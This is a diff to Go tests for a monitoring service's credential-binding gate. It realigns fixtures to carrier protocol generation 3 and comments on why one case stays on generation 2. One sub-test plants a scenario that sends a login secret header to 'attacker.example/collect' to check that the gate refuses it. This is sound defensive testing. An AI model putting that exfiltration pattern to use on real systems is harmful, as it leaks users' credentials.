@@ -336,7 +336,12 @@ func syntheticBindingJob(t *testing.T, ring *CredentialKeyring, scenario string)
 	if err != nil {
 		t.Fatal(err)
 	}
-	return CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV2, CredentialEnvelope: envelope}
+	// Generation 3, because envelope v2 rides generation 3 and nothing else — the mapping is
+	// exact on both sides (`CarrierEnvelopeAdmissible`). This fixture paired envelope v2 with
+	// carrier generation 2, a combination the producer never emits, and the sub-tests below then
+	// passed for a reason none of them names: the carrier rule refused the delivery before the
+	// property under test was reached. Reviewer finding on the iter-0178 P0 patch.
+	return CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV3, CredentialEnvelope: envelope}
 }
 
 func TestScenarioBindingIsSubstitutedIntoTheScenario(t *testing.T) {
@@ -344,7 +349,7 @@ func TestScenarioBindingIsSubstitutedIntoTheScenario(t *testing.T) {
 	scenario := `{"steps":[{"url":"https://api.internal/login","headers":{"authorization":"{{secret:login}}"}}]}`
 	job := syntheticBindingJob(t, ring, scenario)
 
-	got, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2})
+	got, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV3})
 	if err != nil {
 		t.Fatalf("a declared binding must materialize: %v", err)
 	}
@@ -384,7 +389,7 @@ func TestScenarioBindingGateFailsClosed(t *testing.T) {
 	t.Run("no envelope", func(t *testing.T) {
 		job := syntheticBindingJob(t, ring, scenario)
 		job.CredentialEnvelope = nil
-		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV3}); err == nil {
 			t.Fatal("a declared binding with no envelope must refuse: the placeholder would be sent verbatim")
 		}
 	})
@@ -399,6 +404,11 @@ func TestScenarioBindingGateFailsClosed(t *testing.T) {
 	t.Run("envelope that does not bind the body", func(t *testing.T) {
 		// EnvelopeV1 carries no body digest, so a relocation would go undetected. A binding
 		// must refuse that envelope rather than run with a credential nothing pins to a target.
+		//
+		// This one KEEPS carrier generation 2, and that is deliberate: envelope v1 on generation 2
+		// is a legitimate pair, so the carrier rule admits it and the BINDING rule is the thing
+		// that refuses — which is the property this case names. Moving it to generation 3 alongside
+		// its neighbours would make it pass on the carrier mismatch instead, testing nothing.
 		monitor := domain.Monitor{
 			ID: "55555555-5555-5555-5555-555555555555", Region: "core", ExecutionRevision: 1,
 			Type: domain.MonitorSynthetic,
@@ -427,7 +437,7 @@ func TestScenarioBindingGateFailsClosed(t *testing.T) {
 		job := syntheticBindingJob(t, ring, scenario)
 		job.Monitor.Config[domain.SyntheticScenarioKey] =
 			`{"steps":[{"url":"https://attacker.example/collect","headers":{"authorization":"{{secret:login}}"}}]}`
-		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV3}); err == nil {
 			t.Fatal("a relocated placeholder under a valid envelope must fail the gate")
 		}
 	})
@@ -448,8 +458,8 @@ func TestScenarioBindingGateFailsClosed(t *testing.T) {
 		if err != nil {
 			t.Fatal(err)
 		}
-		job := CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV2, CredentialEnvelope: envelope}
-		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV2}); err == nil {
+		job := CheckJob{Monitor: monitor, ProtocolVersion: ProtocolV3, CredentialEnvelope: envelope}
+		if _, err := ValidateAndMaterialize(ring, DeliveredJob{Job: job, CarrierGeneration: ProtocolV3}); err == nil {
 			t.Fatal("an envelope field with no placeholder to fill is a mismatch, not something to ignore")
 		}
 	})
